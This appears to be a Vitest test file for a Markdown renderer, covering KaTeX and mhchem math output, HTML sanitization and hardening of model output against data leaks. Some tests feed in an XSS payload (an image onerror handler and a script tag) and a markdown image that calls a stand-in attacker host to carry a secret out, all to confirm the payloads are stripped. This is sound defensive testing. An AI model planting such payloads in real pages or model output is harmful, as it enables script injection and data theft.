import { describe, expect, it } from 'vitest';
import { renderMarkdown } from '@/lib/render';

describe('renderMarkdown', () => {
  it('renders inline and display math with KaTeX', () => {
    const html = renderMarkdown('Energy $E = mc^2$ and $$\\int_0^1 x\\,dx$$');
    expect(html).toContain('class="katex"');
    expect(html).toContain('katex-display');
    expect(html).not.toContain('$E');
  });

  it('renders chemistry with mhchem', () => {
    const html = renderMarkdown('$\\ce{2H2 + O2 -> 2H2O}$');
    expect(html).toContain('class="katex"');
    expect(html).toContain('H');
  });

  it('keeps underscores inside math out of Markdown emphasis', () => {
    const html = renderMarkdown('$a_1 + a_2$ and $b_1$');
    expect(html).not.toContain('<em>');
  });

  it('sanitizes script tags and event handlers', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)"><script>alert(2)</script>**bold**');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<script');
    expect(html).toContain('<strong>bold</strong>');
  });
});

describe('model output hardening', () => {
  it('never renders remote images, which could carry data out', () => {
    const html = renderMarkdown('See ![chart](https://evil.example/leak?q=secret) and <img src="https://evil.example/x">');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('evil.example/x');
  });

  it('opens links in a new tab so the panel is never navigated away', () => {
    const html = renderMarkdown('[docs](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
